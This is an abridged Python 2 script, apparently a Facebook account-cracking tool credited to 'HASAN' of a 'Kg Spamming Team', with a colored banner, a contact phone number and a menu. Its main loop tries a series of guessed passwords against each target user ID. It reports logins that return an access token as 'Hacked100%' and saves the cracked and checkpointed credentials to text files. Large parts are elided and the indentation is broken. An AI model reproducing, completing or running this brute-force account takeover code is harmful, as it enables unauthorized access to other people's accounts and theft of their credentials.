...
\033[1;91m        _   _    _    ____    _    _   _ 
\033[1;93m        | | | |  / \  / ___|  / \  | \ | |
\033[1;92m        | |_| | / _ \ \___ \ / _ \ |  \| |
\033[1;97m        |  _  |/ ___ \ ___) / ___ \| |\  |
\033[1;96m        |_| |_/_/   \_|____/_/   \_|_| \_|
\033[1;95m  _ _   _   _ _ 
\033[1;95m| | | / \ | | |
 \033[1;95m | V || o || U |
 \033[1;95m \_/ |_n_||___|
...
"""
logo2 = """
\x1b[1;92m➣ NAME :           💗 HASA N 💗
\x1b[1;91m➣ GROUP NAME :  💣Kg Spamming Team 💣
\x1b[1;93m➣ WHATSAPP NO :   👬 +8801996636652👬
...
def menu():
	...
	print '\033[1;97m[6]\033[1;92m Follow Facebook'
...
def action():
	...
	if ahmad =='':
		...
		os.system('xdg-open https://www.facebook.com/kov.balo.cele')
		login()
	elif ahmad =='0':
		exb()
	else:
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				print '\x1b[1;92m{HASAN-Hacked100%💉}  ' + k + c + user + '  》  ' + pass1+'\n'+"\n"
				...
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;96m[HASAN-Checkpoint] ' + k + c + user + '  》  ' + pass1+'\n'
					...
					cpb.append(c+user+pass1)
 				    ...
 				    q = json.load(data)
 				    if 'access_token' in q:
 				        print '\x1b[1;92m{HASAN-Hacked100%💉}  ' + k + c + user + '  》  ' + pass2+'\n'+"\n"
 				        okb = open('save/successfull.txt', 'a')
 				        ...
 				        if 'www.facebook.com' in q['error_msg']:
 					        print '\033[1;96m[HASAN-Checkpoint] ' + k + c + user + '  》  ' + pass2+'\n'
 					        cps = open('save/checkpoint.txt', 'a')
 				            ...
 				            q = json.load(data)
 				            if 'access_token' in q:
 				                print '\x1b[1;92m{HASAN-Hacked100%💉}  ' + k + c + user + '  》  ' + pass3+'\n'+"\n"
 				                okb = open('save/successfull.txt', 'a')
 				                ...
 				                if 'www.facebook.com' in q['error_msg']:
 					                print '\033[1;96m[HASAN-Checkpoint] ' + k + c + user + '  》  ' + pass3+'\n'
 					                cps = open('save/checkpoint.txt', 'a')
 				                    ...
 				                    q = json.load(data)
 				                    if 'access_token' in q:
 				                        print '\x1b[1;92m{HASAN-Hacked100%💉}  ' + k + c + user + '  》  ' + pass4+'\n'+"\n"
 				                        okb = open('save/successfull.txt', 'a')
 				                        ...
 				                        if 'www.facebook.com' in q['error_msg']:
 					                        print '\033[1;96m[HASAN-Checkpoint] ' + k + c + user + '  》  ' + pass4+'\n'
 					                        cps = open('save/checkpoint.txt', 'a')
